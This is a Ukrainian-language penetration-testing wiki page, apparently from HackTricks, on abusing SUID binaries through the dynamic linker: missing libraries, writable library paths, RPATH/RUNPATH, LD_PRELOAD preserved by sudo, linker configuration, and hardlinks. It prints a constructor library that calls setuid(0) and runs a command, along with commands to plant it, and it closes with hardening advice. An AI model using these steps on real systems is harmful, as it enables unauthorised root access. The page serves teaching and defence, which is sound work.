# SUID Shared Library and Linker Abuse

SUID-бінарні файли зазвичай перевіряють на можливість прямого виконання команд, але custom SUID-програми також можуть бути вразливими через dynamic linker. Спільна риса проста: привілейований executable завантажує код із шляху або конфігурації, на які може впливати користувач із нижчим рівнем привілеїв.<sup>[[1]](#references)</sup>

Ця сторінка зосереджена на generic technique patterns: відсутні бібліотеки, директорії бібліотек із правом на запис, `RPATH`/`RUNPATH`, `LD_PRELOAD` через sudo, конфігурація linker і плутанина із SUID hardlink.

## Fast Enumeration

Почніть із пошуку незвичних SUID-файлів і перевірте, чи використовують вони dynamic linking:<sup>[[1]](#references)[[3]](#references)</sup>
```bash
find / -perm -4000 -type f -ls 2>/dev/null
file /path/to/suid-binary
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'NEEDED|RPATH|RUNPATH'
```
Зосередьтеся на нестандартних розташуваннях, шляхах до custom application, бінарних файлах, власником яких є root, але які розташовані за межами каталогів, що керуються пакетним менеджером, а також на dependencies, завантажених із каталогів, доступних для запису.<sup>[[1]](#references)</sup>

Корисні перевірки доступності для запису:
```bash
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'RPATH|RUNPATH'
find / -writable -type d 2>/dev/null | head -n 50
```
## Ін’єкція відсутнього Shared Object

Деякі власні SUID-бінарники намагаються завантажити shared object, якого не існує. Якщо відсутній шлях розташований у каталозі, контрольованому attacker, бінарник може завантажити наданий attacker код із правами effective user.<sup>[[1]](#references)</sup>

Знаходьте невдалі пошуки бібліотек за допомогою syscall filter у `strace`:<sup>[[2]](#references)</sup>
```bash
strace -f -e trace=openat,access /path/to/suid-binary 2>&1 | grep -Ei 'ENOENT|\\.so'
```
Якщо binary шукає `libexample.so` у доступному для запису шляху, мінімальна proof library може використовувати constructor. Під час перевірки зберігайте proof-of-impact нешкідливим:<sup>[[6]](#references)</sup>
```c
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
static void init(void) {
setuid(0);
setgid(0);
system("id > /tmp/suid-so-ran");
}
```
Зберіть його з точною назвою файлу, який бінарний файл намагається завантажити:
```bash
gcc -shared -fPIC proof.c -o /writable/path/libexample.so
/path/to/suid-binary
cat /tmp/suid-so-ran
```
Експлуатованою умовою є не лише відсутня library. Зловмисник має мати змогу розмістити сумісний shared object за шляхом, який привілейований loader прийме.<sup>[[1]](#references)</sup>

## Директорія бібліотеки з правом запису

Іноді всі dependencies існують, але один із каталогів, що використовуються для їх пошуку, доступний для запису. Це може дозволити замінити завантажену library або розмістити library з вищим пріоритетом і таким самим іменем.<sup>[[1]](#references)</sup>

Перевірте шляхи dependencies:<sup>[[1]](#references)[[3]](#references)</sup>
```bash
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'NEEDED|RPATH|RUNPATH'
namei -om /path/to/library.so
```
Якщо директорія доступна для запису, перевірте це в лабораторному середовищі за допомогою безпечного підходу з копією. Заміна системних бібліотек на активному хості може призвести до того, що процеси, які запускаються одночасно, використовуватимуть несумісні версії бібліотек.<sup>[[8]](#references)</sup>

## RPATH and RUNPATH

`RPATH` і `RUNPATH` — це записи dynamic-section, які вказують loader, де шукати бібліотеки. Вони небезпечні в SUID-програмах, коли вказують на директорії, доступні attacker для запису.<sup>[[1]](#references)</sup>

Виявити їх:<sup>[[3]](#references)[[10]](#references)</sup>
```bash
readelf -d /path/to/suid-binary | egrep 'RPATH|RUNPATH'
objdump -p /path/to/suid-binary 2>/dev/null | egrep 'RPATH|RUNPATH'
```
Приклад ризикованого виводу:
```text
0x000000000000001d (RUNPATH)            Library runpath: [/opt/app/lib]
0x0000000000000001 (NEEDED)             Shared library: [libcustom.so]
```
Якщо `/opt/app/lib` доступний для запису, а binary потребує `libcustom.so`, attacker може розмістити там malicious `libcustom.so`:<sup>[[1]](#references)</sup>
```bash
ls -ld /opt/app/lib
gcc -shared -fPIC proof.c -o /opt/app/lib/libcustom.so
/path/to/suid-binary
```
`RPATH` і `RUNPATH` не є ідентичними щодо всіх деталей пошуку, але під час аналізу підвищення привілеїв практичне питання залишається тим самим: чи шукає SUID-бінарний файл бібліотеку за вказаним ім’ям у каталозі, доступному для запису з боку attacker?<sup>[[1]](#references)</sup>

## LD_PRELOAD, LD_LIBRARY_PATH і SUID

Для звичайних програм `LD_PRELOAD` і `LD_LIBRARY_PATH` можуть примусово виконувати або змінювати завантаження shared object. Для SUID-програм dynamic loader зазвичай переходить у secure-execution mode та ігнорує небезпечні змінні середовища.<sup>[[1]](#references)</sup>

Це означає, що звичайний SUID-бінарний файл зазвичай не є вразливим лише через те, що користувач може встановити `LD_PRELOAD`:<sup>[[1]](#references)</sup>
```bash
LD_PRELOAD=/tmp/proof.so /path/to/suid-binary
```
Поширеним винятком є політика `sudo`, яка дозволяє встановлювати або зберігати змінні loader для цільової команди. Перевірте `sudo -l` на наявність записів на кшталт `env_keep+=LD_PRELOAD` або `env_keep+=LD_LIBRARY_PATH`; якщо цільова програма динамічно скомпонована, вона може завантажити код, контрольований зловмисником:<sup>[[4]](#references)[[5]](#references)</sup>
```bash
sudo -l
# Look for env_keep+=LD_PRELOAD or env_keep+=LD_LIBRARY_PATH
sudo LD_PRELOAD=/tmp/proof.so /allowed/command
```
Не плутайте ці випадки; наведені вище правила loader і sudo policy розрізняють їх:<sup>[[1]](#references)[[4]](#references)[[5]](#references)</sup>

- `LD_PRELOAD` проти звичайного SUID binary: зазвичай блокується через secure execution.
- `LD_PRELOAD`, збережений sudo: потенційно exploitable.
- Відсутній `.so` у writable path: exploitable, коли SUID binary природно завантажує цей path.
- `RPATH`/`RUNPATH` до writable directory: exploitable, коли потрібною library можна керувати.
- Доступ на запис до `/etc/ld.so.preload` або linker config: system-wide і має високий impact.

## Конфігурація linker

`ld.so` використовує linker cache і `/etc/ld.so.preload`; `ldconfig` створює цей cache з `/etc/ld.so.conf` і файлів, підключених із нього, зазвичай `/etc/ld.so.conf.d/`.<sup>[[1]](#references)[[7]](#references)[[8]](#references)</sup>

Перевірки з високою цінністю:
```bash
ls -l /etc/ld.so.preload /etc/ld.so.conf 2>/dev/null
find /etc/ld.so.conf.d -type f -writable -ls 2>/dev/null
find /etc/ld.so.conf.d -type d -writable -ls 2>/dev/null
ldconfig -v 2>/dev/null | head -n 50
```
Конфігурація linker із правом запису зазвичай серйозніша за один вразливий SUID binary, оскільки може впливати на багато динамічно зв’язаних процесів. `/etc/ld.so.preload` особливо небезпечний, оскільки може примусово завантажити shared object у привілейовані процеси.<sup>[[1]](#references)[[7]](#references)[[8]](#references)</sup>

## SUID Hardlink Confusion

Hardlinks можуть змусити той самий SUID inode відображатися під кількома іменами.<sup>[[9]](#references)</sup> Це корисно для приховування привілейованого helper, заплутування під час очищення або обходу поверхневої перевірки на основі шляхів.

Знайти SUID-файли з більш ніж одним link:<sup>[[9]](#references)</sup>
```bash
find / -xdev -perm -4000 -type f -links +1 -ls 2>/dev/null
```
Перевірте всі шляхи до того самого inode:<sup>[[9]](#references)</sup>
```bash
stat /path/to/suid-wrapper
find / -xdev -samefile /path/to/suid-wrapper -ls 2>/dev/null
```
Зловживання полягає не в тому, що hardlink змінює permissions. Зловживання — це path confusion: privileged inode може бути доступним через ім’я, якого defenders або scripts не очікують.<sup>[[9]](#references)</sup> Докладніше про inode та workflow hardlink див. [Filesystem, Inodes and Recovery](../main-system-information/filesystem-inodes-and-recovery.md).

## Defensive Notes

- Зберігайте SUID binaries мінімальними, перевіреними та, за можливості, керованими через package manager.
- Уникайте записів `RPATH`/`RUNPATH`, що вказують на writable або application-managed directories.<sup>[[1]](#references)[[8]](#references)</sup>
- Зберігайте library directories у власності root і забороняйте запис для regular users.<sup>[[8]](#references)</sup>
- Не зберігайте `LD_PRELOAD`, `LD_LIBRARY_PATH` або подібні loader variables через sudo.<sup>[[1]](#references)[[5]](#references)</sup>
- Моніторте `/etc/ld.so.preload`, `/etc/ld.so.conf`, `/etc/ld.so.conf.d/` і неочікувані SUID files.<sup>[[1]](#references)[[7]](#references)[[8]](#references)</sup>
- Перевіряйте hardlinked SUID files і досліджуйте custom SUID wrappers поза стандартними system paths.<sup>[[9]](#references)</sup>

## References

- [1] [ld.so(8) — сторінка посібника Linux](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [2] [strace(1) — сторінка посібника Linux](https://man7.org/linux/man-pages/man1/strace.1.html)
- [3] [readelf (GNU Binary Utilities)](https://sourceware.org/binutils/docs/binutils/readelf.html)
- [4] [sudo(8) — сторінка посібника Linux](https://www.man7.org/linux/man-pages/man8/sudo.8.html)
- [5] [sudoers(5) — сторінка посібника Linux](https://man7.org/linux/man-pages/man5/sudoers.5.html)
- [6] [Common Attributes (GCC)](https://gcc.gnu.org/onlinedocs/gcc/Common-Attributes.html)
- [7] [ldconfig(8) — сторінка посібника Linux](https://man7.org/linux/man-pages/man8/ldconfig.8.html)
- [8] [Dynamic Linker Hardening (The GNU C Library)](https://www.sourceware.org/glibc/manual/latest/html_node/Dynamic-Linker-Hardening.html)
- [9] [Hard Links (GNU Findutils)](https://www.gnu.org/software/findutils/manual/html_node/find_html/Hard-Links.html)
- [10] [objdump (GNU Binary Utilities)](https://www.sourceware.org/binutils/docs/binutils/objdump.html)
{{#include ../../banners/hacktricks-training.md}}
